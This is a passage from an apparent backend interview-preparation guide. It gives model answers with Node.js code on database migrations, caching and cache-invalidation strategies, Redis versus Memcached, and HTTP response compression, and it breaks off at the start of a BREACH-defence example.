        status VARCHAR(50) DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);
    
    await db.query(`
      CREATE INDEX idx_orders_user_id ON orders(user_id)
    `);
  },
  
  async down(db) {
    await db.query(`DROP TABLE IF EXISTS orders`);
  }
};
```

**Migration runner:**
```javascript
const fs = require('fs').promises;
const path = require('path');

class MigrationRunner {
  constructor(db) {
    this.db = db;
    this.migrationsDir = path.join(__dirname, 'migrations');
  }
  
  async ensureMigrationsTable() {
    await this.db.query(`
      CREATE TABLE IF NOT EXISTS migrations (
        id SERIAL PRIMARY KEY,
        name VARCHAR(255) UNIQUE NOT NULL,
        executed_at TIMESTAMP DEFAULT NOW()
      )
    `);
  }
  
  async getExecutedMigrations() {
    const result = await this.db.query(
      'SELECT name FROM migrations ORDER BY name'
    );
    return result.rows.map(row => row.name);
  }
  
  async getPendingMigrations() {
    const files = await fs.readdir(this.migrationsDir);
    const migrationFiles = files
      .filter(f => f.endsWith('.js'))
      .sort();
    
    const executed = await this.getExecutedMigrations();
    return migrationFiles.filter(f => !executed.includes(f));
  }
  
  async migrate() {
    await this.ensureMigrationsTable();
    const pending = await this.getPendingMigrations();
    
    if (pending.length === 0) {
      console.log('No pending migrations');
      return;
    }
    
    console.log(`Running ${pending.length} migrations...`);
    
    for (const file of pending) {
      console.log(`Migrating: ${file}`);
      
      const migration = require(path.join(this.migrationsDir, file));
      
      try {
        // Run migration in transaction
        await this.db.query('BEGIN');
        await migration.up(this.db);
        await this.db.query(
          'INSERT INTO migrations (name) VALUES ($1)',
          [file]
        );
        await this.db.query('COMMIT');
        
        console.log(`✓ ${file} completed`);
      } catch (error) {
        await this.db.query('ROLLBACK');
        console.error(`✗ ${file} failed:`, error.message);
        throw error;
      }
    }
    
    console.log('All migrations completed successfully');
  }
  
  async rollback(steps = 1) {
    await this.ensureMigrationsTable();
    const executed = await this.getExecutedMigrations();
    
    if (executed.length === 0) {
      console.log('No migrations to rollback');
      return;
    }
    
    const toRollback = executed.slice(-steps).reverse();
    
    console.log(`Rolling back ${toRollback.length} migrations...`);
    
    for (const file of toRollback) {
      console.log(`Rolling back: ${file}`);
      
      const migration = require(path.join(this.migrationsDir, file));
      
      try {
        await this.db.query('BEGIN');
        await migration.down(this.db);
        await this.db.query(
          'DELETE FROM migrations WHERE name = $1',
          [file]
        );
        await this.db.query('COMMIT');
        
        console.log(`✓ ${file} rolled back`);
      } catch (error) {
        await this.db.query('ROLLBACK');
        console.error(`✗ ${file} rollback failed:`, error.message);
        throw error;
      }
    }
    
    console.log('Rollback completed successfully');
  }
}

// Usage
const runner = new MigrationRunner(db);
await runner.migrate();  // Run pending migrations
await runner.rollback(2);  // Rollback last 2 migrations
```

**Best practices:**

**1. Never modify existing migrations**
```javascript
// ❌ BAD: Editing 001_create_users_table.js after deployment
// Team members already ran it!

// ✅ GOOD: Create new migration
// migrations/004_add_users_phone.js
module.exports = {
  async up(db) {
    await db.query(`ALTER TABLE users ADD COLUMN phone VARCHAR(20)`);
  },
  async down(db) {
    await db.query(`ALTER TABLE users DROP COLUMN phone`);
  }
};
```

**2. Make migrations reversible**
```javascript
// ✅ GOOD: Can rollback
async up(db) {
  await db.query(`ALTER TABLE users ADD COLUMN age INTEGER`);
}

async down(db) {
  await db.query(`ALTER TABLE users DROP COLUMN age`);
}

// ⚠️ Data loss on rollback (acceptable if documented)
async up(db) {
  await db.query(`DELETE FROM users WHERE status = 'inactive'`);
}

async down(db) {
  // Can't restore deleted data!
  throw new Error('This migration cannot be rolled back');
}
```

**3. Test migrations on staging first**
```bash
# Staging
npm run migrate

# Test application
# Verify data integrity

# Production
npm run migrate
```

**4. Backup before migration**
```bash
# Backup database
pg_dump -h localhost -U user mydb > backup_before_migration.sql

# Run migration
npm run migrate

# If something goes wrong:
psql -h localhost -U user mydb < backup_before_migration.sql
```

**5. Zero-downtime migrations**
```javascript
// ❌ BAD: Rename column (breaks old code)
async up(db) {
  await db.query(`ALTER TABLE users RENAME COLUMN name TO full_name`);
}

// ✅ GOOD: Multi-phase migration
// Phase 1: Add new column
async up(db) {
  await db.query(`ALTER TABLE users ADD COLUMN full_name VARCHAR(200)`);
  await db.query(`UPDATE users SET full_name = name`);
}

// Phase 2: Deploy code that uses full_name

// Phase 3: Remove old column
async up(db) {
  await db.query(`ALTER TABLE users DROP COLUMN name`);
}
```

**6. Data migrations**
```javascript
// migrations/010_migrate_user_data.js
module.exports = {
  async up(db) {
    // Batch process to avoid memory issues
    const batchSize = 1000;
    let offset = 0;
    
    while (true) {
      const users = await db.query(`
        SELECT id, name
        FROM users
        WHERE full_name IS NULL
        LIMIT $1 OFFSET $2
      `, [batchSize, offset]);
      
      if (users.rows.length === 0) break;
      
      for (const user of users.rows) {
        const [firstName, lastName] = user.name.split(' ');
        await db.query(`
          UPDATE users
          SET first_name = $1, last_name = $2
          WHERE id = $3
        `, [firstName, lastName, user.id]);
      }
      
      offset += batchSize;
      console.log(`Processed ${offset} users`);
    }
  },
  
  async down(db) {
    // Reverse data migration
    await db.query(`
      UPDATE users
      SET name = CONCAT(first_name, ' ', last_name)
      WHERE name IS NULL
    `);
  }
};
```

**CI/CD integration:**
```yaml
# .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run migrations
        run: |
          npm install
          npm run migrate
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
      
      - name: Deploy application
        run: npm run deploy
```

**Interview tip:** Explain why migrations are needed (version control for database schema), show up/down structure for reversibility, discuss best practices (never edit existing migrations, test on staging first, zero-downtime strategies), and mention CI/CD integration."

---

## Q34: Explain caching strategies and when to use each

**Perfect Answer:**

"Multiple caching layers, each with different use cases:

**1. Memory Cache (Fastest, smallest)**
```javascript
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 300 });  // 5 min default

async function getUser(id) {
  // Check memory cache
  const cached = cache.get(`user:${id}`);
  if (cached) {
    return cached;  // <1ms
  }
  
  // Cache miss, query database
  const user = await db.query('SELECT * FROM users WHERE id = $1', [id]);
  
  // Store in cache
  cache.set(`user:${id}`, user.rows[0]);
  
  return user.rows[0];
}

// Use for: Frequently accessed, small data (< 1MB per item)
```

**2. Redis Cache (Fast, shared across servers)**
```javascript
async function getProduct(id) {
  const cacheKey = `product:${id}`;
  
  // Check Redis
  const cached = await redis.get(cacheKey);
  if (cached) {
    return JSON.parse(cached);  // 2-3ms
  }
  
  // Cache miss
  const product = await db.query('SELECT * FROM products WHERE id = $1', [id]);
  
  // Store in Redis with 1 hour TTL
  await redis.setex(cacheKey, 3600, JSON.stringify(product.rows[0]));
  
  return product.rows[0];
}

// Use for: Shared cache across servers, larger datasets
```

**3. Two-Layer Cache (Memory + Redis)**
```javascript
async function getUserOptimized(id) {
  const cacheKey = `user:${id}`;
  
  // Layer 1: Memory cache
  let user = memoryCache.get(cacheKey);
  if (user) {
    return user;  // <1ms
  }
  
  // Layer 2: Redis cache
  const cached = await redis.get(cacheKey);
  if (cached) {
    user = JSON.parse(cached);
    
    // Populate memory cache
    memoryCache.set(cacheKey, user, 300);  // 5 min
    
    return user;  // 2-3ms
  }
  
  // Layer 3: Database
  const result = await db.query('SELECT * FROM users WHERE id = $1', [id]);
  user = result.rows[0];
  
  // Populate both caches
  await redis.setex(cacheKey, 3600, JSON.stringify(user));  // 1 hour
  memoryCache.set(cacheKey, user, 300);  // 5 min
  
  return user;  // 50ms
}

// Performance:
// 1st request: 50ms (database)
// 2nd request (same server): <1ms (memory)
// 2nd request (different server): 2ms (Redis)
```

**4. Cache Aside (Lazy Loading)**
```javascript
// Load data into cache on demand
async function getOrder(id) {
  const cached = await redis.get(`order:${id}`);
  if (cached) return JSON.parse(cached);
  
  // Not in cache, load from DB
  const order = await db.query('SELECT * FROM orders WHERE id = $1', [id]);
  
  // Cache it
  await redis.setex(`order:${id}`, 3600, JSON.stringify(order.rows[0]));
  
  return order.rows[0];
}

// Pros: Only cache what's accessed
// Cons: Cache miss penalty
```

**5. Write-Through Cache**
```javascript
// Write to cache AND database simultaneously
async function updateUser(id, data) {
  // Update database
  await db.query(
    'UPDATE users SET name = $1, email = $2 WHERE id = $3',
    [data.name, data.email, id]
  );
  
  // Update cache immediately
  const user = await db.query('SELECT * FROM users WHERE id = $1', [id]);
  await redis.setex(`user:${id}`, 3600, JSON.stringify(user.rows[0]));
  
  return user.rows[0];
}

// Pros: Cache always consistent
// Cons: Every write hits both DB and cache
```

**6. Write-Behind (Write-Back) Cache**
```javascript
// Write to cache, async write to DB
async function updateUserAsync(id, data) {
  // Update cache immediately
  await redis.setex(`user:${id}`, 3600, JSON.stringify(data));
  
  // Queue database update (async)
  await queue.add('updateUser', { id, data });
  
  return data;  // Fast response
}

// Background worker
queue.process('updateUser', async (job) => {
  const { id, data } = job.data;
  await db.query(
    'UPDATE users SET name = $1, email = $2 WHERE id = $3',
    [data.name, data.email, id]
  );
});

// Pros: Very fast writes
// Cons: Data loss risk if cache crashes before DB write
```

**7. Cache Invalidation Strategies**
```javascript
// Strategy 1: TTL (Time-To-Live)
await redis.setex('user:123', 3600, userData);  // Auto-expire after 1 hour

// Strategy 2: Explicit invalidation
async function updateUser(id, data) {
  await db.query('UPDATE users SET name = $1 WHERE id = $2', [data.name, id]);
  
  // Invalidate cache
  await redis.del(`user:${id}`);
}

// Strategy 3: Cache tags (invalidate related items)
await redis.set('user:123', userData);
await redis.sadd('tag:users', 'user:123');

// Invalidate all users
const keys = await redis.smembers('tag:users');
await redis.del(...keys);

// Strategy 4: Versioned keys
await redis.set('user:123:v2', userData);  // New version
// Old version (v1) expires naturally
```

**8. Cache Stampede Prevention**
```javascript
// Problem: Cache expires, 1000 requests hit DB simultaneously
// Solution: Lock pattern

async function getProductSafe(id) {
  const cacheKey = `product:${id}`;
  const lockKey = `lock:product:${id}`;
  
  // Check cache
  const cached = await redis.get(cacheKey);
  if (cached) return JSON.parse(cached);
  
  // Try to acquire lock
  const lockAcquired = await redis.set(lockKey, '1', 'EX', 10, 'NX');
  
  if (lockAcquired) {
    try {
      // This request loads data
      const product = await db.query('SELECT * FROM products WHERE id = $1', [id]);
      await redis.setex(cacheKey, 3600, JSON.stringify(product.rows[0]));
      return product.rows[0];
    } finally {
      await redis.del(lockKey);
    }
  } else {
    // Another request is loading, wait and retry
    await sleep(100);
    return getProductSafe(id);  // Retry
  }
}
```

**9. Probabilistic Early Expiration**
```javascript
// Refresh cache before expiration to prevent stampede
async function getWithEarlyRefresh(key, fetchFn, ttl = 3600) {
  const data = await redis.get(key);
  
  if (data) {
    const parsed = JSON.parse(data);
    const expiresIn = await redis.ttl(key);
    
    // Refresh probability increases as expiration approaches
    const refreshProbability = 1 - (expiresIn / ttl);
    
    if (Math.random() < refreshProbability) {
      // Async refresh (don't wait)
      fetchFn().then(newData => {
        redis.setex(key, ttl, JSON.stringify(newData));
      });
    }
    
    return parsed;
  }
  
  // Cache miss
  const newData = await fetchFn();
  await redis.setex(key, ttl, JSON.stringify(newData));
  return newData;
}
```

**10. Cache Performance Metrics**
```javascript
const cacheStats = {
  hits: 0,
  misses: 0,
  sets: 0
};

async function getCached(key, fetchFn) {
  const cached = await redis.get(key);
  
  if (cached) {
    cacheStats.hits++;
    return JSON.parse(cached);
  }
  
  cacheStats.misses++;
  const data = await fetchFn();
  
  await redis.setex(key, 3600, JSON.stringify(data));
  cacheStats.sets++;
  
  return data;
}

// Expose metrics
app.get('/metrics/cache', (req, res) => {
  const total = cacheStats.hits + cacheStats.misses;
  const hitRate = total > 0 ? (cacheStats.hits / total * 100).toFixed(2) : 0;
  
  res.json({
    hits: cacheStats.hits,
    misses: cacheStats.misses,
    sets: cacheStats.sets,
    hitRate: `${hitRate}%`
  });
});

// Target: 80%+ hit rate
```

**When to use each strategy:**

| Strategy | Use Case | Speed | Consistency |
|----------|----------|-------|-------------|
| Memory | Hot data, single server | <1ms | Eventual |
| Redis | Shared cache, medium data | 2-3ms | Eventual |
| Two-layer | Very hot data | <1ms | Eventual |
| Cache-Aside | Read-heavy | Medium | Eventual |
| Write-Through | Consistency important | Slow write | Strong |
| Write-Behind | Write-heavy | Fast write | Weak |

**Interview tip:** Explain multiple strategies, show cache stampede prevention, discuss invalidation (hardest problem), and mention monitoring hit rate to validate caching effectiveness."

---

## Q35: What is cache invalidation and why is it hard?

**Perfect Answer:**

"Cache invalidation is the hardest problem in computer science. Two hard things: naming, cache invalidation, and off-by-one errors.

**Why it's hard:**
```
Problem: Data in cache can become stale
Example:
T=0: User updates profile (DB updated)
T=1: Cache still has old data
T=2: Other user reads profile → sees stale data

Challenge: Keep cache and database in sync
```

**Strategies:**

**1. TTL (Time-To-Live) - Simplest**
```javascript
// Set expiration time
await redis.setex('user:123', 300, JSON.stringify(user));  // 5 minutes

// Pros: Simple, no coordination needed
// Cons: Data can be stale for up to TTL duration
```

**2. Write-Through Invalidation**
```javascript
async function updateUser(id, data) {
  // Transaction
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    
    // Update database
    const result = await client.query(
      'UPDATE users SET name = $1, email = $2 WHERE id = $3 RETURNING *',
      [data.name, data.email, id]
    );
    
    // Invalidate cache
    await redis.del(`user:${id}`);
    
    await client.query('COMMIT');
    
    return result.rows[0];
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}

// Pros: Cache stays fresh
// Cons: Extra latency on writes
```

**3. Event-Based Invalidation**
```javascript
const EventEmitter = require('events');
const cacheEvents = new EventEmitter();

// On update, emit event
async function updateUser(id, data) {
  await db.query('UPDATE users SET name = $1 WHERE id = $2', [data.name, id]);
  
  // Emit event
  cacheEvents.emit('user:updated', id);
}

// Listener invalidates cache
cacheEvents.on('user:updated', async (userId) => {
  await redis.del(`user:${userId}`);
  
  // Also invalidate related caches
  await redis.del(`user:${userId}:orders`);
  await redis.del(`user:${userId}:stats`);
});

// Pros: Decoupled, can invalidate related data
// Cons: Event delivery needs to be reliable
```

**4. Cache Tags (Group Invalidation)**
```javascript
// Tag related cache entries
async function cacheWithTags(key, value, tags, ttl = 3600) {
  // Store value
  await redis.setex(key, ttl, JSON.stringify(value));
  
  // Add to tag sets
  for (const tag of tags) {
    await redis.sadd(`tag:${tag}`, key);
  }
}

// Usage
await cacheWithTags(
  'user:123',
  userData,
  ['users', 'team:5'],  // Tags
  3600
);

// Invalidate all users
async function invalidateTag(tag) {
  const keys = await redis.smembers(`tag:${tag}`);
  
  if (keys.length > 0) {
    await redis.del(...keys);
  }
  
  await redis.del(`tag:${tag}`);
}

await invalidateTag('users');  // Invalidates all user caches
```

**5. Versioned Cache Keys**
```javascript
// Version in key name
let cacheVersion = 1;

async function getUser(id) {
  const key = `user:${id}:v${cacheVersion}`;
  const cached = await redis.get(key);
  
  if (cached) return JSON.parse(cached);
  
  const user = await db.query('SELECT * FROM users WHERE id = $1', [id]);
  await redis.setex(key, 3600, JSON.stringify(user.rows[0]));
  
  return user.rows[0];
}

// Invalidate ALL user caches by incrementing version
function invalidateAllUsers() {
  cacheVersion++;  // Now all reads miss cache
}

// Pros: Instant invalidation, no delete operations
// Cons: Old versions accumulate (need cleanup)
```

**6. CDC (Change Data Capture)**
```javascript
// Database triggers or CDC tool (Debezium) detects changes
// and publishes to message queue

// Listen for database changes
kafka.subscribe('database.users.changes');

kafka.on('message', async (message) => {
  const { operation, id } = JSON.parse(message.value);
  
  if (operation === 'UPDATE' || operation === 'DELETE') {
    // Invalidate cache
    await redis.del(`user:${id}`);
    
    logger.info('Cache invalidated via CDC', { id, operation });
  }
});

// Pros: Decoupled, works across services
// Cons: Complex setup, eventual consistency
```

**7. Thundering Herd Problem**
```javascript
// Problem: Cache expires → 1000 requests hit DB

// Solution 1: Lock
async function getWithLock(key, fetchFn) {
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  
  const lockKey = `lock:${key}`;
  const acquired = await redis.set(lockKey, '1', 'EX', 10, 'NX');
  
  if (acquired) {
    try {
      const data = await fetchFn();
      await redis.setex(key, 3600, JSON.stringify(data));
      return data;
    } finally {
      await redis.del(lockKey);
    }
  } else {
    // Wait for first request to populate cache
    await sleep(50);
    return getWithLock(key, fetchFn);
  }
}

// Solution 2: Stale-While-Revalidate
async function getWithSWR(key, fetchFn, ttl = 3600) {
  const data = await redis.get(key);
  
  if (data) {
    const age = await redis.ttl(key);
    
    // If near expiration, refresh async
    if (age < ttl * 0.1) {  // Last 10% of TTL
      fetchFn().then(newData => {
        redis.setex(key, ttl, JSON.stringify(newData));
      }).catch(err => logger.error('SWR refresh failed', err));
    }
    
    return JSON.parse(data);
  }
  
  // Cache miss
  const newData = await fetchFn();
  await redis.setex(key, ttl, JSON.stringify(newData));
  return newData;
}
```

**8. Cascading Invalidation**
```javascript
// Problem: User update invalidates many related caches
async function updateUser(id, data) {
  await db.query('UPDATE users SET name = $1 WHERE id = $2', [data.name, id]);
  
  // Must invalidate all related caches
  await Promise.all([
    redis.del(`user:${id}`),
    redis.del(`user:${id}:profile`),
    redis.del(`user:${id}:orders`),
    redis.del(`user:${id}:stats`),
    redis.del(`user:${id}:friends`),
    // ... many more
  ]);
  
  // Also need to invalidate caches that include this user
  const teamIds = await getTeamIdsForUser(id);
  for (const teamId of teamIds) {
    await redis.del(`team:${teamId}:members`);
  }
}

// Solution: Dependency graph
const cacheDependencies = {
  'user': ['user:profile', 'user:orders', 'user:stats'],
  'order': ['user:orders', 'order:items'],
  'team': ['team:members', 'user:teams']
};

async function invalidateCascade(entity, id) {
  const deps = cacheDependencies[entity] || [];
  
  const keysToDelete = deps.map(dep => `${dep}:${id}`);
  keysToDelete.push(`${entity}:${id}`);
  
  await redis.del(...keysToDelete);
}
```

**9. Partial Invalidation (Specific Fields)**
```javascript
// Instead of invalidating entire user object,
// only invalidate changed fields

// Store user fields separately
await redis.hset('user:123', {
  name: 'John',
  email: 'john@example.com',
  age: '30'
});

// Update only changed field
async function updateUserName(id, name) {
  await db.query('UPDATE users SET name = $1 WHERE id = $2', [name, id]);
  
  // Only update name field in cache
  await redis.hset(`user:${id}`, 'name', name);
}

// Read remains fast
const user = await redis.hgetall('user:123');
```

**10. Monitor Stale Reads**
```javascript
// Detect when cached data is stale
async function getWithValidation(key, fetchFn) {
  const cached = await redis.get(key);
  
  if (cached) {
    const cachedData = JSON.parse(cached);
    
    // Occasionally validate cache (1% of requests)
    if (Math.random() < 0.01) {
      const freshData = await fetchFn();
      
      // Check if stale
      if (JSON.stringify(freshData) !== JSON.stringify(cachedData)) {
        logger.warn('Stale cache detected', { key });
        
        // Update cache
        await redis.setex(key, 3600, JSON.stringify(freshData));
        
        return freshData;
      }
    }
    
    return cachedData;
  }
  
  const data = await fetchFn();
  await redis.setex(key, 3600, JSON.stringify(data));
  return data;
}
```

**The Two Hard Problems Quote:**
```
"There are only two hard things in Computer Science:
cache invalidation and naming things."
- Phil Karlton

Why cache invalidation is hard:
1. Timing: When to invalidate?
2. Scope: What related data to invalidate?
3. Consistency: How to keep cache and DB in sync?
4. Performance: Invalidation shouldn't be slow
5. Reliability: What if invalidation fails?
6. Distributed: Multiple cache servers
7. Race conditions: Update vs invalidation ordering
```

**Interview tip:** Explain why it's hard (consistency, related data, race conditions), show multiple strategies (TTL, write-through, event-based, versioning), discuss thundering herd problem, and emphasize monitoring for stale data."

---

## Q36: Redis vs Memcached - when to use each?

**Perfect Answer:**

"Redis is more feature-rich, Memcached is simpler and slightly faster for basic caching.

**Redis Advantages:**

**1. Data Structures (Not just strings)**
```javascript
// Strings
await redis.set('user:123:name', 'John');

// Hashes (Objects)
await redis.hset('user:123', {
  name: 'John',
  email: 'john@example.com',
  age: 30
});
const user = await redis.hgetall('user:123');

// Lists (Queues, timelines)
await redis.lpush('notifications:123', 'New message');
const notifications = await redis.lrange('notifications:123', 0, 9);

// Sets (Unique items, tags)
await redis.sadd('user:123:tags', 'javascript', 'nodejs', 'redis');
const tags = await redis.smembers('user:123:tags');

// Sorted Sets (Leaderboards, rankings)
await redis.zadd('leaderboard', 100, 'player1');
await redis.zadd('leaderboard', 200, 'player2');
const top10 = await redis.zrevrange('leaderboard', 0, 9, 'WITHSCORES');

// Memcached: Only strings!
```

**2. Persistence (Survive restarts)**
```javascript
// Redis: Can save to disk
// RDB: Snapshot at intervals
save 900 1      # Save if 1 key changed in 15 min
save 300 10     # Save if 10 keys changed in 5 min
save 60 10000   # Save if 10000 keys changed in 1 min

// AOF: Log every write
appendonly yes
appendfsync everysec  # Fsync every second

// Memcached: All data lost on restart
```

**3. Replication (High availability)**
```javascript
// Redis: Master-slave replication
// Master writes, slaves replicate

// Automatic failover with Sentinel
const redis = new Redis({
  sentinels: [
    { host: 'sentinel1', port: 26379 },
    { host: 'sentinel2', port: 26379 },
    { host: 'sentinel3', port: 26379 }
  ],
  name: 'mymaster'
});

// If master fails, Sentinel promotes slave

// Memcached: No built-in replication
```

**4. Transactions**
```javascript
// Redis: ACID transactions
const multi = redis.multi();
multi.set('user:123:balance', 1000);
multi.decrby('user:123:balance', 100);
multi.incrby('user:456:balance', 100);
await multi.exec();

// All or nothing

// Memcached: No transactions
```

**5. Pub/Sub (Real-time messaging)**
```javascript
// Redis: Built-in pub/sub
// Publisher
await redis.publish('notifications', JSON.stringify({ userId: 123, message: 'Hello' }));

// Subscriber
redis.subscribe('notifications');
redis.on('message', (channel, message) => {
  const data = JSON.parse(message);
  console.log('Notification:', data);
});

// Memcached: No pub/sub
```

**6. Lua Scripting (Atomic operations)**
```javascript
// Redis: Execute Lua scripts atomically
const script = `
  local current = redis.call('GET', KEYS[1])
  if tonumber(current) >= tonumber(ARGV[1]) then
    redis.call('DECRBY', KEYS[1], ARGV[1])
    return 1
  else
    return 0
  end
`;

const success = await redis.eval(script, 1, 'user:123:balance', 100);

// Memcached: No scripting
```

**7. TTL Per Key**
```javascript
// Redis: Individual TTL per key
await redis.setex('session:abc', 3600, sessionData);    // 1 hour
await redis.setex('cache:xyz', 300, cacheData);         // 5 minutes

// Memcached: Also supports TTL per key
```

**Memcached Advantages:**

**1. Slightly Faster for Simple Operations**
```
Benchmark (1M SET operations):
Memcached: 85,000 ops/sec
Redis:     82,000 ops/sec

Difference: ~3% faster for simple GET/SET
```

**2. Multithreading**
```javascript
// Memcached: Uses multiple CPU cores
// Better for multi-core servers

// Redis: Single-threaded (one command at a time)
// But still very fast due to event loop
```

**3. Simpler (Less to learn)**
```javascript
// Memcached: Only 15 commands
set, get, delete, add, replace, etc.

// Redis: 200+ commands
Very powerful but steeper learning curve
```

**4. Automatic Eviction**
```javascript
// Both support LRU (Least Recently Used) eviction
// When memory full, remove least used items

// Memcached: Only LRU
// Redis: Multiple eviction policies
//   - noeviction (return errors when full)
//   - allkeys-lru (evict any key)
//   - volatile-lru (evict keys with TTL)
//   - allkeys-random (random eviction)
//   - volatile-random (random eviction of keys with TTL)
```

**When to use Redis:**
```
✅ Need data structures (hashes, lists, sets, sorted sets)
✅ Need persistence (survive restarts)
✅ Need replication (high availability)
✅ Need pub/sub (real-time features)
✅ Need transactions
✅ Need Lua scripting
✅ Building complex features (leaderboards, rate limiting, job queues)

Examples:
- Session storage (hashes)
- Rate limiting (sorted sets)
- Leaderboards (sorted sets)
- Job queues (lists)
- Real-time notifications (pub/sub)
```

**When to use Memcached:**
```
✅ Simple caching (just strings)
✅ Don't need persistence
✅ Want simplicity
✅ Multi-core server (multithreading benefit)
✅ Facebook-scale (Memcached proven at massive scale)

Examples:
- Simple page caching
- Database query caching
- Session storage (if loss acceptable on restart)
```

**Hybrid approach:**
```javascript
// Use both!
// Memcached: Simple cache
// Redis: Complex features

// Cache rendered pages in Memcached
await memcached.set('page:/about', htmlContent, 3600);

// Rate limiting in Redis (needs sorted sets)
await redis.zadd(`ratelimit:${userId}`, Date.now(), requestId);
const recentRequests = await redis.zcount(
  `ratelimit:${userId}`,
  Date.now() - 60000,
  Date.now()
);
```

**Production recommendation:**
```
Default choice: Redis
- More features
- Active development
- Better ecosystem
- Only slightly slower

Choose Memcached when:
- You really only need GET/SET
- You're optimizing for absolute maximum throughput
- You have Memcached expertise on team
```

**Interview tip:** Explain that Redis has more features (data structures, persistence, pub/sub) while Memcached is simpler and marginally faster. Emphasize Redis as default choice unless you specifically need Memcached's simplicity or multithreading."

---

## Q37: How does response compression work and when to use it?

**Perfect Answer:**

"Compress response body before sending to reduce bandwidth and improve load times.

**Setup:**
```javascript
const compression = require('compression');

app.use(compression({
  level: 6,              // Compression level 0-9 (6 is balanced)
  threshold: 1024,       // Only compress responses > 1KB
  filter: shouldCompress // Custom filter function
}));

function shouldCompress(req, res) {
  // Don't compress if client doesn't support
  if (req.headers['x-no-compression']) {
    return false;
  }
  
  // Use compression module's default filter
  return compression.filter(req, res);
}
```

**Performance impact:**
```javascript
// Example API response
const users = await db.query('SELECT * FROM users');

res.json({ users: users.rows });

// Without compression:
// Response size: 500 KB
// Transfer time (on 3G): 5 seconds

// With gzip compression:
// Response size: 50 KB (90% reduction!)
// Compression time: 20ms (CPU)
// Transfer time: 0.5 seconds (10× faster)
// Net savings: 4.5 seconds (worth the 20ms CPU)
```

**Compression algorithms:**
```javascript
// Client sends Accept-Encoding header
Accept-Encoding: gzip, deflate, br

// Server chooses best algorithm
// Response includes Content-Encoding header
Content-Encoding: gzip

// Algorithms:
// - gzip: Most common, good compression (level 6)
// - deflate: Slightly worse compression
// - br (Brotli): Best compression, slower (Google)
// - zstd: Facebook's algorithm (not widely supported yet)
```

**Compression levels trade-off:**
```javascript
// Level 0: No compression (passthrough)
// Level 1: Fastest, 3:1 ratio, 5ms
// Level 6: Balanced, 10:1 ratio, 20ms (default)
// Level 9: Best, 12:1 ratio, 100ms

app.use(compression({
  level: 6  // Sweet spot for most cases
}));

// For static assets (compress once, serve many):
level: 9

// For dynamic API responses:
level: 6
```

**What to compress:**
```javascript
function shouldCompress(req, res) {
  const contentType = res.getHeader('Content-Type') || '';
  
  // Compress text-based content
  if (
    contentType.includes('text/') ||
    contentType.includes('application/json') ||
    contentType.includes('application/javascript') ||
    contentType.includes('application/xml')
  ) {
    return true;
  }
  
  // Don't compress binary files (already compressed)
  if (
    contentType.includes('image/') ||
    contentType.includes('video/') ||
    contentType.includes('audio/') ||
    contentType.includes('application/zip') ||
    contentType.includes('application/pdf')
  ) {
    return false;
  }
  
  // Don't compress small responses (overhead not worth it)
  const contentLength = res.getHeader('Content-Length');
  if (contentLength && parseInt(contentLength) < 1024) {
    return false;
  }
  
  return compression.filter(req, res);
}
```

**Compression ratio examples:**
```
Content Type          | Original | Compressed | Ratio | Worth it?
----------------------|----------|------------|-------|----------
JSON (API response)   | 500 KB   | 50 KB      | 10:1  | ✅ Yes
HTML (with CSS/JS)    | 200 KB   | 30 KB      | 6.7:1 | ✅ Yes
Plain text            | 100 KB   | 20 KB      | 5:1   | ✅ Yes
JavaScript source     | 300 KB   | 90 KB      | 3.3:1 | ✅ Yes
Image (JPEG)          | 500 KB   | 498 KB     | 1:1   | ❌ No
Video (MP4)           | 10 MB    | 10 MB      | 1:1   | ❌ No
PDF                   | 2 MB     | 2 MB       | 1:1   | ❌ No
Small JSON            | 500 B    | 520 B      | 0.96:1| ❌ No (overhead)
```

**Pre-compression (Static files):**
```javascript
// Build time: Compress assets once
const fs = require('fs');
const zlib = require('zlib');

// Compress bundle.js
const input = fs.readFileSync('public/bundle.js');
const compressed = zlib.gzipSync(input, { level: 9 });
fs.writeFileSync('public/bundle.js.gz', compressed);

// Serve pre-compressed file
app.get('/bundle.js', (req, res) => {
  if (req.acceptsEncodings('gzip')) {
    res.set('Content-Encoding', 'gzip');
    res.set('Content-Type', 'application/javascript');
    res.sendFile('public/bundle.js.gz');
  } else {
    res.sendFile('public/bundle.js');
  }
});

// Benefits:
// - Compress once (build time)
// - Serve many (runtime)
// - Zero CPU during request
// - Can use level 9 (best compression)
```

**Streaming compression:**
```javascript
// For large responses, stream compression
app.get('/api/large-dataset', (req, res) => {
  res.set('Content-Type', 'application/json');
  res.set('Content-Encoding', 'gzip');
  
  const gzip = zlib.createGzip();
  gzip.pipe(res);
  
  // Stream data chunks
  gzip.write('{"data":[');
  
  // Query in batches
  const stream = db.query('SELECT * FROM large_table').stream();
  
  let first = true;
  stream.on('data', (row) => {
    if (!first) gzip.write(',');
    gzip.write(JSON.stringify(row));
    first = false;
  });
  
  stream.on('end', () => {
    gzip.write(']}');
    gzip.end();
  });
});

// Benefits:
// - Low memory usage (stream, don't buffer)
// - Start sending immediately (Time To First Byte)
```

**Brotli (Better than gzip):**
```javascript
const compression = require('compression');

app.use(compression({
  // Enable Brotli
  brotli: {
    enabled: true,
    zlib: {
      level: 11  // Brotli quality 11 (0-11)
    }
  }
}));

// Compression comparison:
// gzip level 6: 100 KB → 10 KB (90% reduction)
// brotli level 11: 100 KB → 8 KB (92% reduction, 20% better!)

// Trade-off:
// Brotli compresses better but slower
// Best for static assets (pre-compress)
// gzip still good for dynamic content
```

**Monitoring compression:**
```javascript
app.use((req, res, next) => {
  const originalSend = res.send;
  
  res.send = function(data) {
    const uncompressed = Buffer.byteLength(data);
    
    res.on('finish', () => {
      const compressed = res.get('Content-Length') || uncompressed;
      const ratio = ((1 - compressed / uncompressed) * 100).toFixed(1);
      
      logger.info('Response compression', {
        url: req.url,
        uncompressed,
        compressed,
        ratio: `${ratio}%`,
        encoding: res.get('Content-Encoding')
      });
    });
    
    originalSend.call(this, data);
  };
  
  next();
});
```

**Security: BREACH attack prevention**
```javascript
// BREACH attack: Exploit compression to steal secrets (CSRF tokens)
// Defense: Add random padding

app.use((req, res, next) => {
  const originalJson = res.json;
  
  res.json = function(data) {
